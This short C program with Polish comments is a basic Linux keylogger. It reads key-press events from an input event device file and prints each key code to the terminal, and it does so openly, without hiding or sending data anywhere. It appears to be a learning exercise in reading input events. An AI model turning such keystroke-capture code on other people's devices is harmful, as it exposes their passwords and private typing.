#include <stdio.h> // Odczyt pliku
#include <fcntl.h> // sterowanie plikiem
#include <stdlib.h> // argumenty
#include <linux/input.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    // Jesli user nie podal - zakoncz
    if (argc != 2)
    {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }

    printf("Keylogger active ...\n");

    // Otwórz plik do odczytu = Deskryptor pliku
    int fd = open(argv[1], O_RDONLY, 0);
    printf("Opened file descriptor: %d\n", fd);

    // input_event {__u16 type; __u16 code; __s32 value}
    struct input_event ie;
    
    // Odczyt pliku - &wskaźnik
    while(1)
    {
        read(fd, &ie, sizeof(ie));

        // tylko klawiatura
        if(ie.type != EV_KEY)
            continue;
        // tylko pojedynczy event
        if(ie.value != 1)
            continue;

        printf("%d\n", ie.code - 1);

        fflush(stdout);
    }
}